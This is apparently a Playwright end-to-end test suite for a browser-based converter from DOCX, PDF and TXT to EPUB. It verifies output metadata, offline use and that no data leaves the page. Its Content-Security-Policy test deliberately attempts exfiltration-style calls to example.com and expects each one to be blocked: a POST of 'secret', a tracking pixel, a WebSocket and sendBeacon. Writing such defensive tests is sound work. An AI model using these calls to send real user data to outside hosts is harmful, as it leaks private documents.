// End-to-end: convert every fixture in a real browser, check the result,
// save the EPUB (validated with epubcheck afterwards) and prove that no
// data leaves the page.
import { test, expect } from '@playwright/test';
import { readdirSync, readFileSync, mkdirSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { join, dirname } from 'node:path';

const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const fixtures = join(root, 'test', 'fixtures');
const outDir = join(root, 'out', 'e2e');
mkdirSync(outDir, { recursive: true });

const STATIC = /^\/(index\.html|app\.css|sw\.js|manifest\.webmanifest|icons\/[\w.-]+|src\/[\w/.-]+\.js|vendor\/[\w/.-]+\.mjs)?$/;

/** Record every request the page (and its workers) makes. */
function recordRequests(page) {
  const seen = [];
  page.context().on('request', (r) => seen.push({ url: r.url(), method: r.method(), body: r.postData() }));
  return seen;
}
function assertOnlyStaticGets(requests, baseURL) {
  for (const r of requests) {
    const u = new URL(r.url);
    if (u.protocol === 'blob:' || u.protocol === 'data:') continue;
    expect(u.origin, `request to another origin: ${r.url}`).toBe(new URL(baseURL).origin);
    expect(r.method, r.url).toBe('GET');
    expect(r.body ?? null, r.url).toBeNull();
    expect(u.search, `query string on ${r.url}`).toBe('');
    expect(u.pathname, `unexpected path ${r.url}`).toMatch(STATIC);
  }
}

const files = readdirSync(fixtures).filter((f) => /\.(docx|pdf|txt)$/.test(f));

for (const name of files) {
  test(`converts ${name}`, async ({ page, baseURL }, info) => {
    const expected = JSON.parse(readFileSync(join(fixtures, `${name}.expected.json`), 'utf8'));
    await page.goto('/');
    await page.waitForLoadState('networkidle');
    const requests = recordRequests(page);
    await page.setInputFiles('#file', join(fixtures, name));

    if (expected.scanned) {
      await expect(page.locator('#error')).toContainText(/scan/i);
      await expect(page.locator('#download')).toBeHidden();
      assertOnlyStaticGets(requests, baseURL);
      return;
    }
    await expect(page.locator('#meta')).toBeVisible();
    await expect(page.locator('#title')).toHaveValue(expected.title);
    await expect(page.locator('#author')).toHaveValue(expected.author);
    await expect(page.locator('#lang')).toHaveValue(expected.lang);
    await expect(page.locator('#toc li')).toHaveText(expected.chapters.map((c) => c.title));

    const [download] = await Promise.all([page.waitForEvent('download'), page.click('#download')]);
    const ascii = (x) => x.normalize('NFKD').replace(/[\u0300-\u036f]/g, '').replace(/·/g, '');
    expect(download.suggestedFilename()).toBe(ascii(`${expected.author} - ${expected.title}.epub`));
    const target = join(outDir, `${info.project.name}-${name.replace(/\./g, '-')}.epub`);
    await download.saveAs(target);
    const bytes = readFileSync(target);
    expect(bytes.subarray(30, 38).toString()).toBe('mimetype');

    // Nothing but the app's own static files was requested while converting.
    assertOnlyStaticGets(requests, baseURL);
  });
}

test('the Content-Security-Policy blocks every network connection', async ({ page }) => {
  await page.goto('/');
  await page.waitForLoadState('networkidle');
  // Chromium reports a request event for the blocked <img> before refusing it,
  // so record what actually completed and why the rest failed.
  const finished = [];
  const failed = [];
  page.context().on('requestfinished', (r) => finished.push(r.url()));
  page.context().on('requestfailed', (r) => failed.push([r.url(), r.failure()?.errorText]));
  const results = await page.evaluate(async () => {
    const violations = [];
    document.addEventListener('securitypolicyviolation', (e) => violations.push(e.violatedDirective));
    const attempt = async (fn) => { try { await fn(); return 'allowed'; } catch { return 'blocked'; } };
    const r = {
      external: await attempt(() => fetch('https://example.com/upload', { method: 'POST', body: 'secret' })),
      sameOrigin: await attempt(() => fetch('/collect', { method: 'POST', body: 'secret' })),
      image: await new Promise((res) => { const i = new Image(); i.onload = () => res('allowed'); i.onerror = () => res('blocked'); i.src = 'https://example.com/pixel.png?d=secret'; }),
      websocket: await new Promise((res) => { try { const w = new WebSocket('wss://example.com/'); w.onopen = () => res('allowed'); w.onerror = () => res('blocked'); } catch { res('blocked'); } }),
    };
    navigator.sendBeacon('https://example.com/b', 'secret'); // must be blocked too (checked below)
    await new Promise((res) => setTimeout(res, 300));
    r.violations = violations.length;
    return r;
  });
  expect(results).toMatchObject({ external: 'blocked', sameOrigin: 'blocked', image: 'blocked', websocket: 'blocked' });
  expect(results.violations).toBeGreaterThanOrEqual(4);
  // and nothing actually went out
  expect(finished).toEqual([]);
  for (const [url, why] of failed) expect(why, url).toMatch(/csp|blocked/i);
});

test('works offline once loaded (service worker)', async ({ page, context, browserName }) => {
  test.skip(browserName !== 'chromium');
  await page.goto('/');
  await page.evaluate(async () => { await navigator.serviceWorker.ready; });
  await page.reload();
  await expect.poll(() => page.evaluate(() => !!navigator.serviceWorker.controller)).toBe(true);
  // make sure the PDF reader is cached too
  await page.evaluate(async () => { await caches.match('vendor/pdfjs/pdf.worker.min.mjs').then((r) => { if (!r) throw new Error('not cached'); }); });
  await context.setOffline(true);
  await page.reload();
  await page.setInputFiles('#file', join(fixtures, 'novel-es.pdf'));
  await expect(page.locator('#toc li')).toHaveCount(4);
  const [download] = await Promise.all([page.waitForEvent('download'), page.click('#download')]);
  expect(download.suggestedFilename()).toMatch(/\.epub$/);
  await context.setOffline(false);
});

test('layout fits a phone screen without horizontal scrolling', async ({ page }) => {
  await page.goto('/');
  await page.setInputFiles('#file', join(fixtures, 'novel-es.docx'));
  await expect(page.locator('#meta')).toBeVisible();
  const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
  expect(overflow).toBeLessThanOrEqual(0);
});

test('editing title, author and the confidential line ends up in the EPUB', async ({ page }) => {
  await page.goto('/');
  await page.setInputFiles('#file', join(fixtures, 'plain-en.txt'));
  await page.fill('#title', 'A New Title');
  await page.fill('#author', 'Someone Else');
  await page.fill('#received', '2026-11-02');
  const [download] = await Promise.all([page.waitForEvent('download'), page.click('#download')]);
  const path = join(outDir, `edited-${test.info().project.name}.epub`);
  await download.saveAs(path);
  const { unzipSync, strFromU8 } = await import('../../vendor/fflate/fflate.mjs');
  const f = unzipSync(new Uint8Array(readFileSync(path)));
  expect(strFromU8(f['OEBPS/content.opf'])).toContain('<dc:title>A New Title</dc:title>');
  expect(strFromU8(f['OEBPS/titlepage.xhtml'])).toContain('Confidential submission, received 2 November 2026');
  expect(f['OEBPS/cover.png']?.length ?? 0).toBeGreaterThan(1000);
});
